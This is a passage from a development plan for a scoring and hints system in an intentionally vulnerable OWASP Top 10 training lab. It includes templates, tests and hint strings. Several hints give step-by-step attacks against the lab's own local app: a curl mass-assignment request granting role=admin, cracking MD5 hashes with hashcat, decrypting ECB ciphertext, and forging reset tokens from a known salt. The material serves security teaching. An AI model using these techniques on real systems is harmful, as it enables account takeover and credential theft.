{% set badge_classes = {"Easy": "text-bg-success", "Medium": "text-bg-warning", "Hard": "text-bg-danger"} %}
<div class="d-flex justify-content-between align-items-center mb-3">
  <h1>{{ example_title }}</h1>
  <div class="d-flex align-items-center gap-2">
    {% if current_example %}
    <form method="post" action="{{ url_for('core.toggle_progress') }}" class="d-inline">
      <input type="hidden" name="example_id" value="{{ current_example.id }}">
      {% if current_example.id in completed_example_ids %}
      <button type="submit" class="btn btn-success btn-sm">
        {% if settings.scoring_enabled %}✓ Completed — {{ current_progress.points_awarded }} pts{% else %}✓ Completed{% endif %}
      </button>
      {% else %}
      <button type="submit" class="btn btn-outline-secondary btn-sm">
        {% if settings.scoring_enabled %}Mark as done (earn {{ current_example_pending_points }} pts){% else %}Mark as done{% endif %}
      </button>
      {% endif %}
    </form>
    {% endif %}
    <span class="badge {{ badge_classes[example_difficulty] }}">{{ example_difficulty }}</span>
  </div>
</div>

{% if settings.show_explanations %}
<section class="card mb-4">
  <div class="card-header">Explanation</div>
  <div class="card-body">
    {% block explanation %}{% endblock %}
  </div>
</section>
{% endif %}

{% if settings.show_exploit_instructions and not settings.scoring_enabled %}
{% set detect_content = self.detect() %}
{% if detect_content|trim %}
<section class="card mb-4">
  <div class="card-header">Detect</div>
  <div class="card-body">
    {% block detect %}{% endblock %}
  </div>
</section>
{% endif %}

<section class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white">Exploitation</div>
  <div class="card-body">
    {% block exploitation %}{% endblock %}
  </div>
</section>

{% set tasks_content = self.tasks() %}
{% if tasks_content|trim %}
<section class="card mb-4">
  <div class="card-header">Tasks</div>
  <div class="card-body">
    {% block tasks %}{% endblock %}
  </div>
</section>
{% endif %}
{% endif %}

{% if settings.scoring_enabled and current_example %}
<section class="card mb-4 border-warning">
  <div class="card-header bg-warning">Hints</div>
  <div class="card-body">
    {% for hint in current_example.hints[:current_progress.hints_used] %}
    <p><strong>Hint {{ loop.index }}:</strong> {{ hint }}</p>
    {% endfor %}
    {% if current_progress.hints_used < current_example.hints|length %}
    <form method="post" action="{{ url_for('core.reveal_hint') }}">
      <input type="hidden" name="example_id" value="{{ current_example.id }}">
      <button type="submit" class="btn btn-outline-warning btn-sm">
        Reveal next hint ({{ current_progress.hints_used }} of {{ current_example.hints|length }} used)
      </button>
    </form>
    {% else %}
    <p class="text-muted mb-0">All hints revealed.</p>
    {% endif %}
  </div>
</section>
{% endif %}

{% set vulnerable_content = self.vulnerable_code() %}
{% set secure_content = self.secure_code() %}
{% if vulnerable_content|trim or secure_content|trim %}
<section class="card mb-4">
  <div class="card-header">Vulnerable vs. Secure</div>
  <div class="card-body">
    <div class="row">
      <div class="col-md-6">
        <h6>Vulnerable</h6>
        <pre><code class="language-{{ code_language|default('python') }}">{% block vulnerable_code %}{% endblock %}</code></pre>
      </div>
      <div class="col-md-6">
        <h6>Secure</h6>
        <pre><code class="language-{{ code_language|default('python') }}">{% block secure_code %}{% endblock %}</code></pre>
      </div>
    </div>
  </div>
</section>
{% endif %}

<section class="card">
  <div class="card-header">Try It</div>
  <div class="card-body">
    {% block live_example %}{% endblock %}
  </div>
</section>
{% endblock %}
```

- [ ] **Step 11: Modify `app/core/templates/core/settings.html`**

Current file:

```html
{% extends "core/base.html" %}
{% block title %}Settings — OWASP Top 10 Lab{% endblock %}
{% block content %}
<h1>Lab Settings</h1>
<p class="text-muted">These toggles apply globally across every category and example page.</p>

<form method="post" action="{{ url_for('core.settings_page') }}" class="mb-4">
  <div class="form-check form-switch mb-2">
    <input class="form-check-input" type="checkbox" role="switch" id="show_explanations"
           name="show_explanations" {% if settings.show_explanations %}checked{% endif %}>
    <label class="form-check-label" for="show_explanations">Show vulnerability explanations</label>
  </div>
  <div class="form-check form-switch mb-3">
    <input class="form-check-input" type="checkbox" role="switch" id="show_exploit_instructions"
           name="show_exploit_instructions" {% if settings.show_exploit_instructions %}checked{% endif %}>
    <label class="form-check-label" for="show_exploit_instructions">Show exploit instructions / PoC payloads</label>
  </div>
  <button type="submit" class="btn btn-primary">Save settings</button>
</form>

<hr>

<h2>Reset Lab</h2>
<p class="text-muted">Restores the database to its initial synthetic dataset. Use this between training sessions.</p>
<form method="post" action="{{ url_for('core.reset_lab') }}"
      onsubmit="return confirm('Reset the lab to its clean seeded state? This discards any changes made during exploitation.');">
  <button type="submit" class="btn btn-danger">Reset lab to clean state</button>
</form>
{% endblock %}
```

Replace the first `<form>...</form>` block with (everything from `<hr>`
onward is unchanged):

```html
<form method="post" action="{{ url_for('core.settings_page') }}" class="mb-4">
  <div class="form-check form-switch mb-2">
    <input class="form-check-input" type="checkbox" role="switch" id="show_explanations"
           name="show_explanations" {% if settings.show_explanations %}checked{% endif %}>
    <label class="form-check-label" for="show_explanations">Show vulnerability explanations</label>
  </div>
  <div class="form-check form-switch mb-2">
    <input class="form-check-input" type="checkbox" role="switch" id="show_exploit_instructions"
           name="show_exploit_instructions" {% if settings.show_exploit_instructions %}checked{% endif %}
           {% if settings.scoring_enabled %}disabled{% endif %}>
    <label class="form-check-label" for="show_exploit_instructions">Show exploit instructions / PoC payloads</label>
    {% if settings.scoring_enabled %}
    <div class="form-text">Hidden while the scoring system is enabled — use hints instead. Disable scoring to restore manual control over this toggle.</div>
    {% endif %}
  </div>
  <div class="form-check form-switch mb-3">
    <input class="form-check-input" type="checkbox" role="switch" id="scoring_enabled"
           name="scoring_enabled" {% if settings.scoring_enabled %}checked{% endif %}>
    <label class="form-check-label" for="scoring_enabled">Enable scoring system</label>
    <div class="form-text">Award points on completion: 30 Hard / 20 Medium / 10 Easy, minus a share per hint requested.</div>
  </div>
  <button type="submit" class="btn btn-primary">Save settings</button>
</form>
```

- [ ] **Step 12: Modify `app/core/templates/core/base.html`'s nav bar**

Find this block (inside the right-side `<ul class="navbar-nav">`):

```html
        <ul class="navbar-nav">
          {% if current_user %}
          <li class="nav-item d-flex align-items-center text-light me-3">Logged in as {{ current_user.username }}</li>
          {% else %}
          <li class="nav-item"><a class="nav-link" href="{{ url_for('core.switch_user') }}">Log in</a></li>
          {% endif %}
```

Replace it with (adding one new `<li>` before the existing `{% if
current_user %}` block; everything else in this `<ul>` is unchanged):

```html
        <ul class="navbar-nav">
          {% if settings.scoring_enabled %}
          <li class="nav-item d-flex align-items-center text-light me-3">Score: {{ nav_score_earned }} / {{ nav_score_max }}</li>
          {% endif %}
          {% if current_user %}
          <li class="nav-item d-flex align-items-center text-light me-3">Logged in as {{ current_user.username }}</li>
          {% else %}
          <li class="nav-item"><a class="nav-link" href="{{ url_for('core.switch_user') }}">Log in</a></li>
          {% endif %}
```

- [ ] **Step 13: Modify `app/core/templates/core/home.html`**

Current file:

```html
{% extends "core/base.html" %}
{% block title %}OWASP Top 10 Training Lab{% endblock %}
{% block content %}
<h1>OWASP Top 10 (2021) Training Lab</h1>
<p class="lead">Pick a category below to see its overview and graduated, exploitable examples.</p>

<div class="card mb-4">
  <div class="card-body">
    <div class="d-flex justify-content-between mb-1">
      <span class="fw-bold">Overall</span>
      <span>{{ completed_total }} of {{ total }} completed — {{ overall_percent }}%</span>
    </div>
    <div class="progress" role="progressbar" aria-label="Overall progress" aria-valuenow="{{ completed_total }}" aria-valuemin="0" aria-valuemax="{{ total }}">
      <div class="progress-bar" style="width: {{ overall_percent }}%"></div>
    </div>
  </div>
</div>

<div class="row row-cols-1 row-cols-md-2 g-3 mt-2">
  {% for cs in category_stats %}
  <div class="col">
    <div class="card h-100">
      <div class="card-body">
        <h5 class="card-title">{{ cs.category.short_id }}: {{ cs.category.title }}</h5>
        <div class="mb-1">{{ cs.completed }} of {{ cs.total }} completed</div>
        <div class="progress mb-3" role="progressbar" aria-label="{{ cs.category.short_id }} progress" aria-valuenow="{{ cs.completed }}" aria-valuemin="0" aria-valuemax="{{ cs.total }}">
          <div class="progress-bar" style="width: {{ cs.percent }}%"></div>
        </div>
        <a href="{{ url_for(cs.category.overview_endpoint) }}" class="btn btn-outline-primary btn-sm">Open overview</a>
      </div>
    </div>
  </div>
  {% endfor %}
</div>
{% endblock %}
```

Replace it in full with:

```html
{% extends "core/base.html" %}
{% block title %}OWASP Top 10 Training Lab{% endblock %}
{% block content %}
<h1>OWASP Top 10 (2021) Training Lab</h1>
<p class="lead">Pick a category below to see its overview and graduated, exploitable examples.</p>

<div class="card mb-4">
  <div class="card-body">
    <div class="d-flex justify-content-between mb-1">
      <span class="fw-bold">Overall</span>
      <span>{{ completed_total }} of {{ total }} completed — {{ overall_percent }}%</span>
    </div>
    <div class="progress" role="progressbar" aria-label="Overall progress" aria-valuenow="{{ completed_total }}" aria-valuemin="0" aria-valuemax="{{ total }}">
      <div class="progress-bar" style="width: {{ overall_percent }}%"></div>
    </div>
    {% if settings.scoring_enabled %}
    <div class="mt-2 text-muted">Score: {{ earned_points_total }} / {{ max_points_total }} points</div>
    {% endif %}
  </div>
</div>

<div class="row row-cols-1 row-cols-md-2 g-3 mt-2">
  {% for cs in category_stats %}
  <div class="col">
    <div class="card h-100">
      <div class="card-body">
        <h5 class="card-title">{{ cs.category.short_id }}: {{ cs.category.title }}</h5>
        <div class="mb-1">{{ cs.completed }} of {{ cs.total }} completed</div>
        <div class="progress mb-3" role="progressbar" aria-label="{{ cs.category.short_id }} progress" aria-valuenow="{{ cs.completed }}" aria-valuemin="0" aria-valuemax="{{ cs.total }}">
          <div class="progress-bar" style="width: {{ cs.percent }}%"></div>
        </div>
        {% if settings.scoring_enabled %}
        <div class="mb-2 text-muted small">Score: {{ cs.earned_points }} / {{ cs.max_points }} points</div>
        {% endif %}
        <a href="{{ url_for(cs.category.overview_endpoint) }}" class="btn btn-outline-primary btn-sm">Open overview</a>
      </div>
    </div>
  </div>
  {% endfor %}
</div>
{% endblock %}
```

- [ ] **Step 14: Update `tests/test_progress.py` for the new unmark semantics**

The row-deletion behavior on untoggle no longer applies. Find this test:

```python
def test_toggle_progress_unmarks_on_second_toggle(app, client):
    seed_database(app)
    example = _safe_test_example()

    client.post("/progress/toggle", data={"example_id": example.id})
    client.post("/progress/toggle", data={"example_id": example.id})

    with app.app_context():
        assert ExampleProgress.query.filter_by(example_id=example.id).first() is None
```

Replace it with:

```python
def test_toggle_progress_unmarks_on_second_toggle(app, client):
    seed_database(app)
    example = _safe_test_example()

    client.post("/progress/toggle", data={"example_id": example.id})
    client.post("/progress/toggle", data={"example_id": example.id})

    with app.app_context():
        progress = ExampleProgress.query.filter_by(example_id=example.id).first()
        assert progress is not None
        assert progress.completed_at is None
```

Every other test in this file is unaffected (`test_reset_lab_clears_progress`
still passes unchanged — `reset_lab()` does a full `drop_all()`+`create_all()`,
not a row-level unmark, so `ExampleProgress.query.count() == 0` after reset
remains correct either way).

- [ ] **Step 15: Write the hints/scoring integration tests**

Create `tests/test_hints.py`:

```python
from flask import url_for

from app.core.models import ExampleProgress, Settings
from app.core.nav import CATEGORIES
from app.core.seed import seed_database
from app.extensions import db


def _a10_example(example_id):
    a10 = next(c for c in CATEGORIES if c.id == "a10_ssrf")
    return next(e for e in a10.examples if e.id == example_id)


def _enable_scoring(app):
    with app.app_context():
        settings = Settings.get()
        settings.scoring_enabled = True
        db.session.commit()


def test_reveal_hint_increments_hints_used(app, client):
    seed_database(app)
    _enable_scoring(app)
    example = _a10_example("webhook-internal-metadata")

    client.post("/hints/reveal", data={"example_id": example.id})

    with app.app_context():
        progress = ExampleProgress.query.filter_by(example_id=example.id).first()
        assert progress.hints_used == 1


def test_reveal_hint_is_capped_at_the_examples_hint_count(app, client):
    seed_database(app)
    _enable_scoring(app)
    example = _a10_example("webhook-internal-metadata")
    assert len(example.hints) == 3

    for _ in range(5):
        client.post("/hints/reveal", data={"example_id": example.id})

    with app.app_context():
        progress = ExampleProgress.query.filter_by(example_id=example.id).first()
        assert progress.hints_used == 3


def test_revealed_hint_text_appears_on_the_example_page(app, client):
    seed_database(app)
    _enable_scoring(app)
    example = _a10_example("webhook-internal-metadata")

    client.post("/hints/reveal", data={"example_id": example.id})

    with app.test_request_context():
        path = url_for(example.endpoint)
    response = client.get(path)
    assert example.hints[0].encode() in response.data
    assert example.hints[1].encode() not in response.data


def test_mark_as_done_button_previews_exact_point_value(app, client):
    seed_database(app)
    _enable_scoring(app)
    example = _a10_example("webhook-internal-metadata")

    client.post("/hints/reveal", data={"example_id": example.id})

    with app.test_request_context():
        path = url_for(example.endpoint)
    response = client.get(path)
    assert b"Mark as done (earn 7 pts)" in response.data


def test_points_freeze_at_completion_and_survive_later_hint_reveals(app, client):
    seed_database(app)
    _enable_scoring(app)
    example = _a10_example("fetch-based-port-scan")

    client.post("/hints/reveal", data={"example_id": example.id})
    client.post("/progress/toggle", data={"example_id": example.id})

    with app.app_context():
        progress = ExampleProgress.query.filter_by(example_id=example.id).first()
        assert progress.points_awarded == 15

    client.post("/hints/reveal", data={"example_id": example.id})

    with app.app_context():
        progress = ExampleProgress.query.filter_by(example_id=example.id).first()
        assert progress.points_awarded == 15


def test_unmarking_and_recompleting_recomputes_points_fresh(app, client):
    seed_database(app)
    _enable_scoring(app)
    example = _a10_example("blocklist-redirect-bypass")

    client.post("/progress/toggle", data={"example_id": example.id})
    with app.app_context():
        progress = ExampleProgress.query.filter_by(example_id=example.id).first()
        assert progress.points_awarded == 30

    client.post("/progress/toggle", data={"example_id": example.id})
    client.post("/hints/reveal", data={"example_id": example.id})
    client.post("/hints/reveal", data={"example_id": example.id})
    client.post("/progress/toggle", data={"example_id": example.id})

    with app.app_context():
        progress = ExampleProgress.query.filter_by(example_id=example.id).first()
        assert progress.points_awarded == 18


def test_scoring_enabled_hides_exploit_instructions_regardless_of_stored_value(app, client):
    seed_database(app)
    with app.app_context():
        settings = Settings.get()
        settings.show_exploit_instructions = True
        settings.scoring_enabled = True
        db.session.commit()
    example = _a10_example("webhook-internal-metadata")

    with app.test_request_context():
        path = url_for(example.endpoint)
    response = client.get(path)
    assert b'card-header bg-danger text-white">Exploitation' not in response.data


def test_settings_post_does_not_clear_show_exploit_instructions_while_enabling_scoring(app, client):
    seed_database(app)
    with app.app_context():
        settings = Settings.get()
        settings.show_exploit_instructions = True
        db.session.commit()

    # Simulates the browser: the exploit-instructions checkbox is disabled
    # while scoring is being turned on, so it is omitted from the submitted
    # form data entirely.
    client.post(
        "/settings",
        data={"show_explanations": "on", "scoring_enabled": "on"},
    )

    with app.app_context():
        settings = Settings.get()
        assert settings.show_exploit_instructions is True
        assert settings.scoring_enabled is True


def test_home_page_shows_score_totals_when_scoring_enabled(app, client):
    seed_database(app)
    _enable_scoring(app)
    example = _a10_example("webhook-internal-metadata")
    client.post("/progress/toggle", data={"example_id": example.id})

    response = client.get("/")
    body = response.data.decode()
    assert "Score: 10 / 1340 points" in body


def test_nav_bar_shows_running_score_on_any_page_when_scoring_enabled(app, client):
    seed_database(app)
    _enable_scoring(app)
    example = _a10_example("webhook-internal-metadata")
    client.post("/progress/toggle", data={"example_id": example.id})

    with app.test_request_context():
        path = url_for("a10_ssrf.overview")
    response = client.get(path)
    assert b"Score: 10 / 1340" in response.data


def test_score_ui_absent_when_scoring_disabled(client):
    response = client.get("/")
    assert b"Score:" not in response.data
```

- [ ] **Step 16: Run the new and updated test files**

Run: `.venv/bin/pytest tests/test_scoring.py tests/test_hints.py tests/test_progress.py -v`
Expected: all PASS.

- [ ] **Step 17: Run the full test suite**

Run: `.venv/bin/pytest tests/ -q`
Expected: all pass. Baseline before this plan was 423. This step adds:
4 (`test_scoring.py`) + 13 (`test_hints.py`) = 17 new tests, 0 removed
(`test_progress.py`'s one changed test replaces, not adds) → 440 total.

- [ ] **Step 18: Commit**

```bash
git add app/core/views.py app/core/__init__.py \
  app/core/templates/core/example_page_base.html \
  app/core/templates/core/settings.html \
  app/core/templates/core/base.html \
  app/core/templates/core/home.html \
  app/categories/a10_ssrf/__init__.py \
  tests/test_progress.py tests/test_hints.py
git commit -m "feat(scoring): wire up hint reveal/mark-done routes, settings, nav+home score display, A10 pilot hints

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Note on hint text and HTML escaping (applies to every remaining task)

Hints are plain Python strings rendered through the real Jinja expression
`{{ hint }}` in `example_page_base.html` (added in Task 1) — NOT static
block text like this app's `explanation`/`exploitation` blocks. Flask's
Jinja environment autoescapes `{{ ... }}` expressions by default, so any
literal `<`, `>`, or `&` character written directly in a hint string is
automatically escaped to safe HTML at render time. **Hint strings in every
task below must use plain, unescaped characters (`<`, `>`, `&`) — never
`&lt;`/`&gt;`/`&amp;` entities.** Writing HTML entities into a hint string
would double-escape (Jinja would escape the literal `&` in `&gt;` too,
rendering the visible text `&gt;` instead of `>`), which is a real,
visible bug. This is the opposite convention from this app's other
teaching-text blocks (`vulnerable_code`, `exploitation`, etc.), which
are NOT autoescaped and do need manual entity-encoding for literal
angle brackets — do not carry that convention over to hint text.

---

## Task 2: A01 Hints — Broken Access Control (3 examples)

**Files:**
- Modify: `app/categories/a01_access_control/__init__.py`
- Test: `tests/test_a01_hints.py`

**Interfaces:**
- Consumes: `ExampleNav.hints` field (Task 1).
- Produces: nothing new consumed by later tasks — each category task is
  independent.

- [ ] **Step 1: Write the failing shape test**

Create `tests/test_a01_hints.py`:

```python
from app.core.nav import CATEGORIES


def test_a01_examples_have_well_formed_hint_sequences():
    a01 = next(c for c in CATEGORIES if c.id == "a01_access_control")
    assert len(a01.examples) == 3
    for example in a01.examples:
        assert 3 <= len(example.hints) <= 5, f"{example.id} has {len(example.hints)} hints"
        assert all(hint.strip() for hint in example.hints), f"{example.id} has an empty hint"
        assert len(set(example.hints)) == len(example.hints), f"{example.id} has duplicate hints"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a01_hints.py -v`
Expected: FAIL — every example currently has `hints == []` (length 0, not
in range 3-5).

- [ ] **Step 3: Add hints to each `ExampleNav`**

Modify `app/categories/a01_access_control/__init__.py`. Current file:

```python
from flask import Blueprint

a01_bp = Blueprint(
    "a01_access_control", __name__, template_folder="templates", url_prefix="/a01"
)

from app.categories.a01_access_control import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a01_access_control",
        short_id="A01",
        title="Broken Access Control",
        blurb="Access control that is not enforced on the server, letting users act outside their intended permissions.",
        blueprint_name="a01_access_control",
        overview_endpoint="a01_access_control.overview",
        examples=[
            ExampleNav(
                id="idor",
                title="View Another User's Profile (IDOR)",
                group="Insecure Direct Object References (IDOR)",
                difficulty="Easy",
                endpoint="a01_access_control.idor",
            ),
            ExampleNav(
                id="admin-users",
                title="Hidden Admin Panel",
                group="Missing Function-Level Access Control",
                difficulty="Medium",
                endpoint="a01_access_control.admin_users",
            ),
            ExampleNav(
                id="mass-assignment",
                title="Account Update Role Escalation",
                group="Mass Assignment",
                difficulty="Hard",
                endpoint="a01_access_control.account_update",
            ),
        ],
    )
)
```

Replace it in full with:

```python
from flask import Blueprint

a01_bp = Blueprint(
    "a01_access_control", __name__, template_folder="templates", url_prefix="/a01"
)

from app.categories.a01_access_control import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a01_access_control",
        short_id="A01",
        title="Broken Access Control",
        blurb="Access control that is not enforced on the server, letting users act outside their intended permissions.",
        blueprint_name="a01_access_control",
        overview_endpoint="a01_access_control.overview",
        examples=[
            ExampleNav(
                id="idor",
                title="View Another User's Profile (IDOR)",
                group="Insecure Direct Object References (IDOR)",
                difficulty="Easy",
                endpoint="a01_access_control.idor",
                hints=[
                    "This page shows a user profile by ID, and the ID is right there in the URL. What happens if you don't view your own profile, but someone else's?",
                    "The route is /a01/profile/<user_id> — nothing on the server checks whether the ID you ask for belongs to the account you're logged in as.",
                    "Log in as any user, then edit the URL to /a01/profile/2 (or any other user ID) — the server happily returns that other user's full profile with no ownership check at all.",
                ],
            ),
            ExampleNav(
                id="admin-users",
                title="Hidden Admin Panel",
                group="Missing Function-Level Access Control",
                difficulty="Medium",
                endpoint="a01_access_control.admin_users",
                hints=[
                    "This admin panel changes another user's role. Who's actually allowed to submit that form?",
                    "The route only checks that SOMEONE is logged in — it never checks that the logged-in user is themselves an admin before letting them promote anyone.",
                    "Log in as any regular (non-admin) user, navigate to /a01/admin/users, and submit the form with your own user ID and role=admin — the server grants it with no authorization check at all.",
                ],
            ),
            ExampleNav(
                id="mass-assignment",
                title="Account Update Role Escalation",
                group="Mass Assignment",
                difficulty="Hard",
                endpoint="a01_access_control.account_update",
                hints=[
                    "This form is meant to update your display name and bio. Look at how the server processes the submission — does it only accept the fields the form actually shows you?",
                    "The handler loops over every key in the submitted form data and sets it directly as an attribute on your user record, skipping only the 'id' field. Nothing limits it to display_name/bio.",
                    "The User model has a 'role' column. Submit the account-update form with an extra field named role set to admin (e.g. by adding a hidden field via your browser's dev tools, or crafting the raw request) — the handler happily sets your own role to admin, since it never restricts which fields it accepts.",
                    "Exact reproduction: POST to /a01/account/update with form data including role=admin alongside the normal fields — e.g. curl -X POST -d \"display_name=Me&bio=hi&role=admin\" http://127.0.0.1:5000/a01/account/update (with your session cookie) works.",
                ],
            ),
        ],
    )
)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a01_hints.py -v`
Expected: PASS (1 passed)

- [ ] **Step 5: Run the full test suite**

Run: `.venv/bin/pytest tests/ -q`
Expected: all pass (440 baseline from Task 1 + 1 new = 441).

- [ ] **Step 6: Commit**

```bash
git add app/categories/a01_access_control/__init__.py tests/test_a01_hints.py
git commit -m "feat(scoring): author hints for A01 examples

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Task 3: A02 Hints — Cryptographic Failures (3 examples)

**Files:**
- Modify: `app/categories/a02_crypto_failures/__init__.py`
- Test: `tests/test_a02_hints.py`

**Interfaces:**
- Consumes: `ExampleNav.hints` field (Task 1).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Write the failing shape test**

Create `tests/test_a02_hints.py`:

```python
from app.core.nav import CATEGORIES


def test_a02_examples_have_well_formed_hint_sequences():
    a02 = next(c for c in CATEGORIES if c.id == "a02_crypto_failures")
    assert len(a02.examples) == 3
    for example in a02.examples:
        assert 3 <= len(example.hints) <= 5, f"{example.id} has {len(example.hints)} hints"
        assert all(hint.strip() for hint in example.hints), f"{example.id} has an empty hint"
        assert len(set(example.hints)) == len(example.hints), f"{example.id} has duplicate hints"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a02_hints.py -v`
Expected: FAIL — every example currently has `hints == []`.

- [ ] **Step 3: Add hints to each `ExampleNav`**

Modify `app/categories/a02_crypto_failures/__init__.py`. Current file:

```python
from flask import Blueprint

a02_bp = Blueprint(
    "a02_crypto_failures", __name__, template_folder="templates", url_prefix="/a02"
)

from app.categories.a02_crypto_failures import routes  # noqa: E402,F401
from app.categories.a02_crypto_failures.seed import seed_legacy_credentials  # noqa: E402
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a02_crypto_failures",
        short_id="A02",
        title="Cryptographic Failures",
        blurb="Weak or misused cryptography that exposes passwords and sensitive data instead of protecting them.",
        blueprint_name="a02_crypto_failures",
        overview_endpoint="a02_crypto_failures.overview",
        examples=[
            ExampleNav(
                id="credential-dump",
                title="Leaked Credential Dump",
                group="Weak Hashing",
                difficulty="Easy",
                endpoint="a02_crypto_failures.credential_dump",
            ),
            ExampleNav(
                id="encrypted-notes",
                title="Weak Encryption (ECB Mode)",
                group="Weak Encryption",
                difficulty="Medium",
                endpoint="a02_crypto_failures.encrypted_notes",
            ),
            ExampleNav(
                id="reset-token",
                title="Predictable Password Reset Token",
                group="Predictable Tokens",
                difficulty="Hard",
                endpoint="a02_crypto_failures.forgot_password",
            ),
        ],
        seed_fn=seed_legacy_credentials,
    )
)
```

Replace it in full with:

```python
from flask import Blueprint

a02_bp = Blueprint(
    "a02_crypto_failures", __name__, template_folder="templates", url_prefix="/a02"
)

from app.categories.a02_crypto_failures import routes  # noqa: E402,F401
from app.categories.a02_crypto_failures.seed import seed_legacy_credentials  # noqa: E402
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a02_crypto_failures",
        short_id="A02",
        title="Cryptographic Failures",
        blurb="Weak or misused cryptography that exposes passwords and sensitive data instead of protecting them.",
        blueprint_name="a02_crypto_failures",
        overview_endpoint="a02_crypto_failures.overview",
        examples=[
            ExampleNav(
                id="credential-dump",
                title="Leaked Credential Dump",
                group="Weak Hashing",
                difficulty="Easy",
                endpoint="a02_crypto_failures.credential_dump",
                hints=[
                    "This page 'leaked' a dump of stored credentials. Look closely at the hash column — what hashing algorithm produces output that length and format?",
                    "These are unsalted MD5 hashes (32 hex characters, no per-user salt visible anywhere). MD5 is fast to compute and has no protection against precomputed lookup tables.",
                    "Take any hash from the dump and look it up in an online MD5 reverse-lookup / rainbow-table service, or run it through hashcat -m 0 with a wordlist — common/weak passwords crack in seconds.",
                    "Once you've recovered a plaintext password from its hash, log in with it at /a02/legacy-login using the matching username — the login route re-hashes your submitted password with the same weak MD5 and compares.",
                ],
            ),
            ExampleNav(
                id="encrypted-notes",
                title="Weak Encryption (ECB Mode)",
                group="Weak Encryption",
                difficulty="Medium",
                endpoint="a02_crypto_failures.encrypted_notes",
                hints=[
                    "This page shows encrypted security answers, and ALSO provides a form to decrypt some ciphertext. What happens if you use that decrypt form on a ciphertext already shown on the same page?",
                    "The 'decrypt' feature has no restriction on WHOSE ciphertext it will decrypt — the encryption key is shared, and this page holds it server-side for anyone to use.",
                    "Copy the hex ciphertext shown next to any username, paste it into the 'decrypt' form, and submit — the page decrypts it and shows you that user's real security answer, no key needed on your end at all.",
                    "Even without decrypting: this is ECB mode, which encrypts identical plaintext blocks to identical ciphertext blocks. Compare the ciphertexts for two different usernames byte-for-byte — if they match, their security answers are identical, information leaked without decrypting anything.",
                ],
            ),
            ExampleNav(
                id="reset-token",
                title="Predictable Password Reset Token",
                group="Predictable Tokens",
                difficulty="Hard",
                endpoint="a02_crypto_failures.forgot_password",
                hints=[
                    "The reset flow never shows you a token when you request one — normal secure flows do exactly this too, so that alone isn't the tell. Look instead at HOW the token is generated: is it derived from anything you already know?",
                    "The token is computed as md5(f'{username}:SOME_SALT')[:10] — a pure function of the username and a fixed, never-rotated secret. If you knew that secret, you could compute anyone's token yourself.",
                    "This example's own source discloses the exact salt used: resetSalt2024. Compute hashlib.md5(f'admin:resetSalt2024'.encode()).hexdigest()[:10] in Python.",
                    "Visit /a02/reset-password/<the token you computed> and submit a new password for the admin account — the app never checks you own that account, only that you know a valid token for it.",
                    "Confirm the takeover by logging in at /a02/legacy-login as admin with your new password.",
                ],
            ),
        ],
        seed_fn=seed_legacy_credentials,
    )
)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a02_hints.py -v`
Expected: PASS (1 passed)

- [ ] **Step 5: Run the full test suite**

Run: `.venv/bin/pytest tests/ -q`
Expected: all pass (441 baseline from Task 2 + 1 new = 442).

- [ ] **Step 6: Commit**

```bash
git add app/categories/a02_crypto_failures/__init__.py tests/test_a02_hints.py
git commit -m "feat(scoring): author hints for A02 examples

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Task 4: A03 Hints — SQL Injection Group (7 examples)

**Files:**
- Modify: `app/categories/a03_injection/__init__.py`
- Test: `tests/test_a03_hints_sqli_group.py`

**Interfaces:**
- Consumes: `ExampleNav.hints` field (Task 1).
- Produces: nothing consumed by later tasks. Task 5 (A03's remaining 12
  examples) touches the same file but a disjoint set of `ExampleNav`
  entries — no conflict, but do not run both tasks' implementers in
  parallel (standard SDD rule).

- [ ] **Step 1: Write the failing shape test**

Create `tests/test_a03_hints_sqli_group.py`:

```python
from app.core.nav import CATEGORIES

SQLI_GROUP_IDS = [
    "sqli-login",
    "union-exfiltration",
    "roster-sort",
    "error-based-sqli",
    "blind-sqli",
    "roster-lookup",
    "sqli-to-rce",
]


def test_a03_sqli_group_examples_have_well_formed_hint_sequences():
    a03 = next(c for c in CATEGORIES if c.id == "a03_injection")
    examples_by_id = {e.id: e for e in a03.examples}
    for example_id in SQLI_GROUP_IDS:
        example = examples_by_id[example_id]
        assert 3 <= len(example.hints) <= 5, f"{example.id} has {len(example.hints)} hints"
        assert all(hint.strip() for hint in example.hints), f"{example.id} has an empty hint"
        assert len(set(example.hints)) == len(example.hints), f"{example.id} has duplicate hints"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a03_hints_sqli_group.py -v`
Expected: FAIL — every listed example currently has `hints == []`.

- [ ] **Step 3: Add `hints=[...]` to each of these 7 `ExampleNav` entries**

Modify `app/categories/a03_injection/__init__.py`. Find each of the
following 7 `ExampleNav(...)` calls (they are NOT contiguous in the file —
they're interleaved with the XSS/OS-command/XXE/SSTI/LDAP groups Task 5
handles) and add a `hints=[...]` argument to each, immediately after its
`endpoint=` line, leaving every other field and every other `ExampleNav`
entry in the file completely unchanged:

Find:
```python
            ExampleNav(
                id="sqli-login",
                title="Authentication Bypass via SQL Injection",
                group="SQL Injection",
                difficulty="Easy",
                endpoint="a03_injection.login",
            ),
```
Replace with:
```python
            ExampleNav(
                id="sqli-login",
                title="Authentication Bypass via SQL Injection",
                group="SQL Injection",
                difficulty="Easy",
                endpoint="a03_injection.login",
                hints=[
                    "This login form builds its database query by directly inserting your username and password into a SQL string. What happens if one of those fields contains a character that has special meaning in SQL, like a quote?",
